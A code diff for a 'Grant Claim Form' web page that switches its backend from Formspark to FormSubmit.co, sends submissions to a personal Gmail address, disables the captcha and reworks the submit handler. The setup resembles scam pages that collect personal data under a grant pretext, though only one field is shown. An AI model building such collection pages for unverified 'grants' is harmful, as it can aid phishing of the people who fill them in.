@@ -164,6 +164,7 @@
       color: #004aad;
     }
 
+    /* Loading spinner */
     .loading {
       display: none;
       text-align: center;
@@ -210,11 +211,13 @@
     </div>
 
     <div class="form-wrapper" id="formWrapper">
-      <!-- FORMSPARK - YOUR FORM ID: 61W33rm5j -->
-      <form action="https://submit-form.com/61W33rm5j" method="POST" id="grantForm">
-        <!-- Formspark hidden fields -->
-        <input type="hidden" name="_redirect" value="https://example.com/thank-you" />
-        <input type="hidden" name="_email" value="andrewmutuchi@gmail.com" />
+      <!-- FORMSUBMIT.CO - NO REGISTRATION NEEDED -->
+      <form action="https://formsubmit.co/andrewmutuchi@gmail.com" method="POST" id="grantForm">
+        <!-- FormSubmit hidden fields -->
+        <input type="hidden" name="_captcha" value="false" />
+        <input type="hidden" name="_next" value="https://example.com/thank-you" />
+        <input type="hidden" name="_subject" value="New Grant Claim Form Submission" />
+        <input type="hidden" name="_template" value="table" />
         
         <div class="form-fields" id="formFields">
           <label for="fname">First Name</label>
@@ -361,7 +364,7 @@
         });
       }
 
-      // Form submission - Formspark
+      // Form submission - FormSubmit.co
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -372,7 +375,7 @@
 
         const formData = new FormData(form);
 
-        // Submit to Formspark
+        // Submit to FormSubmit.co
         fetch(form.action, {
           method: 'POST',
           body: formData,
@@ -380,29 +383,27 @@
             'Accept': 'application/json'
           }
         })
-        .then(response => {
+        .then(response => response.json())
+        .then(data => {
           loadingSpinner.classList.remove('show');
           
-          if (response.ok) {
-            return response.json();
+          if (data.success) {
+            // Success
+            thankYou.style.display = 'block';
+            formFields.style.display = 'none';
+            container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
+            submitBtn.textContent = 'Submitted ✓';
+            console.log('✅ Form submitted successfully!');
+            console.log('📧 Check your email: andrewmutuchi@gmail.com');
+            console.log('📝 First submission: Check your email for confirmation link');
           } else {
-            throw new Error('Formspark submission failed');
+            // If fetch fails, submit normally
+            form.submit();
           }
-        })
-        .then(data => {
-          // Success
-          thankYou.style.display = 'block';
-          formFields.style.display = 'none';
-          container.style.boxShadow = '0 4px 12px rgba(0, 74, 173, 0.15)';
-          submitBtn.textContent = 'Submitted ✓';
-          console.log('✅ Form submitted successfully!');
-          console.log('📧 Check: andrewmutuchi@gmail.com');
-          console.log('📊 Formspark ID: 61W33rm5j');
         })
         .catch(error => {
           loadingSpinner.classList.remove('show');
-          console.warn('Fetch error, trying normal form submission...');
-          // Fallback: submit form normally
+          console.warn('Fetch failed, submitting normally...');
           form.submit();
         });
       });
